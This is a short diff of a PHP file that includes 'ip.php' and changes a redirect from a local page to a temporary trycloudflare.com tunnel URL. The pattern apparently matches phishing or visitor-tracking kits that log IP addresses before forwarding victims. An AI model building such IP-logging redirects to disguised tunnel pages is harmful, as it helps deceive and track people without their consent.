@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: /index.html');
+header('Location: https://genesis-restored-west-phrase.trycloudflare.com/index.html');
 exit
 ?>
